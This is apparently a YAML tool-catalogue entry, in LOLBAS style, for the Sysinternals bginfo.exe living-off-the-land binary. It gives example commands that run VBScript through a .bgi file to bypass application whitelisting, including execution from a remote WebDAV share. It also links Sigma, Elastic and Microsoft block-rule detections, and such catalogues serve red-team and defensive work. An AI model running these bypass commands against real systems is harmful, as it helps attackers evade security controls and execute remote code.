---
id: windows-execution-bginfo
namespace: windows:execution:bginfo
name: bginfo
description: 'Background Information Utility included with SysInternals Suite Located at: no default.'
author: Oddvar Moe
version: 1.0.0
capabilities:
- security.execution.command
- security.defense-evasion.bypass
platforms:
- windows
risk_level: high
trust_level: community
execution_policy: enabled
architectures:
- amd64
dependencies: []
related_tools: []
artifacts: []
workflow_edges:
  produces:
  - command-output
  consumes: []
contract:
  inputs: []
  outputs:
  - type: process.output
    description: Command execution output
  side_effects:
  - process_spawn
  resource_cost:
    cpu: low
    memory_mb: 16
    network: low
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 16
  network: low
  disk_io: low
allowed-tools:
- bginfo
parameters: []
features: []
execution:
  template: bginfo
  sandbox: execFile
  timeout_seconds: 30
  shell: false
global_vars: {}
examples:
- description: Execute VBscript code that is referenced within the specified .bgi file. (Local execution of VBScript)
  command: bginfo.exe {PATH:.bgi} /popup /nolicprompt
- description: Execute VBscript code that is referenced within the specified .bgi file. (Local execution of VBScript)
  command: bginfo.exe {PATH:.bgi} /popup /nolicprompt
- description: Execute bginfo.exe from a WebDAV server. (Remote execution of VBScript)
  command: \\10.10.10.10\webdav\bginfo.exe {PATH:.bgi} /popup /nolicprompt
- description: Execute bginfo.exe from a WebDAV server. (Remote execution of VBScript)
  command: \\10.10.10.10\webdav\bginfo.exe {PATH:.bgi} /popup /nolicprompt
- description: This style of execution may not longer work due to patch. (Remote execution of VBScript)
  command: \\live.sysinternals.com\Tools\bginfo.exe {PATH_SMB:.bgi} /popup /nolicprompt
- description: This style of execution may not longer work due to patch. (Remote execution of VBScript)
  command: \\live.sysinternals.com\Tools\bginfo.exe {PATH_SMB:.bgi} /popup /nolicprompt
references:
- label: ''
  url: https://oddvar.moe/2017/05/18/bypassing-application-whitelisting-with-bginfo/
techniques:
- execution
- defense-evasion
mitre_ids:
- T1218
detections:
- type: sigma
  url: https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_lolbin_bginfo.yml
- type: elastic
  url: https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_unusual_process_network_connection.toml
- type: elastic
  url: https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_network_connection_from_windows_binary.toml
- type: blockrule
  url: https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules
install:
- method: choco
  package_name: bginfo
  commands:
  - choco install bginfo
---


# bginfo

bginfo is a Windows LOLBin. Background Information Utility included with SysInternals Suite Located at: no default.
